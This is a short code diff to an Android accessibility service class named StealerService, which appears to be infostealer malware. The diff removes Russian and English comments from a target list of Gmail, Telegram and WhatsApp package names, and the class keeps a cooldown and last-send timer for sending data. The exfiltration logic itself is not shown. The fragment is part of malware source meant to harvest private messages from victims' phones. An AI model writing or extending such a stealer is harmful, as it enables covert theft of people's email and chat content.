@@ -12,15 +12,14 @@ public class StealerService extends AccessibilityService {
     private static final long COOLDOWN = 8000;
     private long lastSend = 0;
 
-    // ТОЛЬКО ЦЕЛЕВЫЕ — Gmail и Telegram, плюс рядом стоящие
     private static final List<String> TARGETS = Arrays.asList(
-        "com.google.android.gm",              // Gmail
-        "com.google.android.apps.gmail",      // Gmail (старый вариант пакета)
-        "org.telegram.messenger",             // Telegram
-        "org.telegram.messenger.web",         // Telegram Web
-        "org.thunderdog.challegram",          // Telegram X
-        "com.whatsapp",                       // WhatsApp
-        "com.whatsapp.w4b"                    // WhatsApp Business
+        "com.google.android.gm",
+        "com.google.android.apps.gmail",
+        "org.telegram.messenger",
+        "org.telegram.messenger.web",
+        "org.thunderdog.challegram",
+        "com.whatsapp",
+        "com.whatsapp.w4b"
     );
 
     @Override
